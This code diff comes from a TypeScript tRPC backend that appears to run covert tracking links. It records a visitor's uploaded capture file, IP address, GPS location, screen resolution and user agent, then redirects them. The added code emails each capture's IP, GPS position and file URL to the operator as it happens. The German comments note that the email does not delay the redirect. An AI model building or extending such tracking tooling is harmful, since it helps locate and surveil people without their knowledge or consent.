@@ -6,6 +6,7 @@ import { z } from "zod";
 import * as db from "./db";
 import { storagePut } from "./storage";
 import { nanoid } from "nanoid";
+import { sendCaptureNotification } from "./email";
 
 export const appRouter = router({
   system: systemRouter,
@@ -106,6 +107,7 @@ export const appRouter = router({
         const fileName = `capture_${input.linkId}_${Date.now()}_${captureId}.${ext}`;
         const s3Result = await storagePut(fileName, buffer, mime);
 
+        const now = new Date();
         await db.createCapture({
           id: captureId,
           linkId: input.linkId,
@@ -115,7 +117,18 @@ export const appRouter = router({
           resolution: input.resolution || "Unbekannt",
           userAgent: userAgent,
           filePath: s3Result.url,
+          createdAt: now,
         });
+
+        // E-Mail-Benachrichtigung async senden (blockiert die Weiterleitung nicht)
+        sendCaptureNotification({
+          linkId: input.linkId,
+          ip: ip.trim(),
+          gps: input.gps || "Nicht verfügbar",
+          resolution: input.resolution || "Unbekannt",
+          filePath: s3Result.url,
+          createdAt: now,
+        }).catch((err) => console.error("[SMTP] Mail error:", err));
 
         return { success: true, redirectUrl: link.redirectUrl };
       }),
